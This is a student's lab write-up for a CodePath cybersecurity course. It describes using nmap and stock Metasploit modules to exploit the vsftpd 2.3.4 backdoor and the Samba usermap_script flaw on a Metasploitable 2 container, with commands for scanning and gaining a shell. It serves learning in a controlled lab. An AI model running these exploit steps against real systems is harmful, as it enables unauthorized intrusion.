# Project 4 – Exploiting the vsftpd Backdoor

This project demonstrates how I discovered and exploited a known backdoor vulnerability in the vsftpd 2.3.4 FTP server using the Metasploit Framework within a controlled lab environment.

---

## 🔍 Tools Used
- **Metasploit Framework**
- **Nmap**
- **Ubuntu 20.04.6 LTS**
- **Metasploitable 2 (Ubuntu 8.04)**
- **Docker**

---

## ⚙️ Steps Taken

1. **Launched Metasploitable**
   - Command: `docker start -ai metasploitable`
   - Verified shell access as `root@...`
<img width="572" height="597" alt="image" src="https://github.com/user-attachments/assets/082cd63b-1988-4c9e-b004-9e3a52d5b9dc" />


2. **Verified OS Versions**
   - Command: `lsb_release -a`
   - Ubuntu Host: 20.04.6 (focal)
   - Metasploitable: Ubuntu 8.04 (hardy)
<img width="582" height="605" alt="image" src="https://github.com/user-attachments/assets/09764e0d-e359-441d-89ce-d54b64dc2a4b" />
<img width="582" height="611" alt="image" src="https://github.com/user-attachments/assets/bfadd28d-27df-4489-bbf0-6aa367e5eb22" />


3. **Identified Target IP**
   - Ubuntu (host): `docker0` IP: `172.17.0.1`
   - Metasploitable: `eth0` IP: `172.17.0.2` (yours may vary)
   - Command: `ifconfig`
<img width="1063" height="136" alt="image" src="https://github.com/user-attachments/assets/bcc5d22f-b227-479c-bd72-9cbb589cd48f" />


4. **Performed Nmap Recon**
   - Full port scan: `nmap -p0-65535 172.17.0.2`
   - Vulnerability scan on FTP port:  
     `nmap --script vuln -p 21 172.17.0.2`
   - Identified: `vsftpd 2.3.4` backdoor vulnerability
<img width="1054" height="630" alt="image" src="https://github.com/user-attachments/assets/14a6a4c9-ee5e-4df4-9c1d-3e0545f163a1" />
<img width="1052" height="334" alt="image" src="https://github.com/user-attachments/assets/d6a1bcf7-551c-4597-9913-2c85b289f725" />


5. **Launched Metasploit**
   - Command: `msfconsole`
   - Loaded module: `use exploit/unix/ftp/vsftpd_234_backdoor`
   - Set target IP: `set RHOSTS 172.17.0.2`
   - Ran exploit: `exploit`
   - Result: Shell access to Metasploitable
<img width="689" height="697" alt="image" src="https://github.com/user-attachments/assets/0a19cc68-0d4f-4466-96a1-3ffeacf597ac" />
<img width="1393" height="640" alt="image" src="https://github.com/user-attachments/assets/c16bdd31-ac39-4f65-b278-75cbd1c256d6" />
<img width="1054" height="622" alt="image" src="https://github.com/user-attachments/assets/872469e7-1293-4708-aeae-d6ed08cb093f" />


6. **Verified Exploit Success**
   - Command: `lsb_release -a`
   - Confirmed access to Ubuntu 8.04 inside shell session
<img width="1052" height="451" alt="image" src="https://github.com/user-attachments/assets/56479051-c6be-40d7-9175-75a01e4e486e" />


7. **Stretch Challenge: Exploited Samba on Port 139**
   - Scanned: `nmap -p 139 --script vuln 172.17.0.2`
   - Exploit: `exploit/multi/samba/usermap_script`
   - Set RHOSTS: `set RHOSTS 172.17.0.2`
   - Ran exploit and gained shell
<img width="1054" height="633" alt="image" src="https://github.com/user-attachments/assets/ffdc9c7f-e40a-44e2-b88c-18f32b61ed6c" />

---


## 🧠 What I Learned
- How to identify vulnerable services using Nmap
- How to use Metasploit to load and run known exploits
- How to verify system access after an exploit
- How to troubleshoot issues like shell delays or terminal crashes
- Gained deeper understanding of how FTP backdoors work

---

## 🤔 Reflection

### Reflection #1 – If I had to describe this project in 3 emojis:
⏳😩🧠  
(It took a long time, was stressful at times, but I learned a lot!)

### Reflection #2 – Other vulnerable ports to investigate:
- **22** (SSH)
- **23** (Telnet)
- **80** (HTTP)
- **139/445** (Samba/SMB)
- **3306** (MySQL)

These commonly-used ports often have unpatched or misconfigured services that can be exploited.

### Shoutout:
Huge thanks to the CodePath team and ChatGPT for helping me troubleshoot crashes and stay on track!

---

## 📁 Author
Ryan Nartey | CodePath Cybersecurity | Summer 2025
